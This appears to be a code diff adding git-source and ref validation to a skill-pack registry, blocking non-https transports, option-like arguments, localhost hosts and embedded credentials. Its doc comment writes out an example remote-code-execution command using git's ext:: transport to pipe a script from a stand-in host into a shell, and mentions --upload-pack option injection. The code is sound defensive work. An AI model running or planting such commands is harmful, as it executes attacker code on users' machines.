@@ -94,6 +94,12 @@ export function validateEntry(entry: Partial<RegistryEntry>): EntryCheck {
         return { ok: false, error: `"${entry.name}" is not a usable pack name — use lowercase letters, digits and hyphens.` };
     }
     if (!entry.source?.trim()) return { ok: false, error: `"${entry.name}" has no source.` };
+    // Remote sources only: a relative path is resolved against the registry file and is not
+    // a git URL at all, so it never reaches the transport this guards.
+    if (/^[a-z][a-z0-9+.-]*:/i.test(entry.source.trim()) || entry.source.trim().startsWith('-')) {
+        const sourceCheck = validateSource(entry.source);
+        if (!sourceCheck.ok) return { ok: false, error: `"${entry.name}": ${sourceCheck.error}` };
+    }
     if (!entry.ref?.trim()) {
         return { ok: false, error: `"${entry.name}" has no ref. Pin a tag or a commit SHA so the same install gives the same pack.` };
     }
@@ -106,6 +112,67 @@ export function validateEntry(entry: Partial<RegistryEntry>): EntryCheck {
     }
     if (!entry.checksum || !/^[a-f0-9]{64}$/i.test(entry.checksum)) {
         return { ok: false, error: `"${entry.name}" has no valid SHA-256 checksum.` };
+    }
+    return { ok: true };
+}
+
+/**
+ * Is this source safe to hand to `git`?
+ *
+ * The check that earns this function: **git's `ext::` transport executes a shell command.**
+ * `git fetch ext::sh -c 'curl evil.sh|sh'` is remote code execution triggered by a string
+ * that looks like a URL, and every other gate in this module runs *after* the fetch — the
+ * checksum cannot protect content that was never the payload. `validateEntry` deliberately
+ * does not do this: it is about whether an entry is *meaningful* (pinned, checksummed), and
+ * folding a transport check into it would bury the one clause that stops code running.
+ *
+ * So this is an allowlist of one scheme rather than a deny list of known-bad ones. A deny
+ * list here has to enumerate `ext::`, `file://`, `ssh://`, `git://`, the scp-like
+ * `host:path` form and whatever git adds next; missing any one of them is the whole bug.
+ */
+export function validateSource(source: string): EntryCheck {
+    const raw = String(source || '').trim();
+    if (!raw) return { ok: false, error: 'A pack source cannot be empty.' };
+
+    // A leading dash is read by git as an option, not a URL — `--upload-pack=…` is the
+    // same class of hole as `ext::` and is not expressible as a scheme check.
+    if (raw.startsWith('-')) {
+        return { ok: false, error: `"${raw}" starts with "-", which git would read as an option rather than a URL.` };
+    }
+    if (!/^https:\/\//i.test(raw)) {
+        return {
+            ok: false,
+            error: `Skill packs can only be fetched over https. "${raw.slice(0, 60)}" is not — and some git `
+                + 'transports (ext::, file://) run commands or read local paths, which a checksum cannot undo.',
+        };
+    }
+
+    let url: URL;
+    try {
+        url = new URL(raw);
+    } catch {
+        return { ok: false, error: `"${raw.slice(0, 60)}" is not a URL git can fetch.` };
+    }
+    if (!url.hostname || url.hostname === 'localhost' || /^127\./.test(url.hostname)) {
+        return { ok: false, error: `"${url.hostname || 'that URL'}" is not a remote host.` };
+    }
+    // Credentials in the URL end up in the registry file, which is committed.
+    if (url.username || url.password) {
+        return { ok: false, error: 'Remove the credentials from the URL — a registry file is committed, and this one would commit a token.' };
+    }
+    return { ok: true };
+}
+
+/** A ref that git will accept as an argument and that names one thing. */
+export function validateRef(ref: string): EntryCheck {
+    const raw = String(ref || '').trim();
+    if (!raw) return { ok: false, error: 'A pack needs a ref.' };
+    if (raw.startsWith('-')) return { ok: false, error: `"${raw}" starts with "-", which git would read as an option.` };
+    if (!/^[A-Za-z0-9._\/-]{1,128}$/.test(raw) || raw.includes('..')) {
+        return { ok: false, error: `"${raw}" is not a usable git ref.` };
+    }
+    if (MOVING_REFS.test(raw)) {
+        return { ok: false, error: `"${raw}" moves, so a checksum against it could not mean anything. Use a tag or a commit SHA.` };
     }
     return { ok: true };
 }
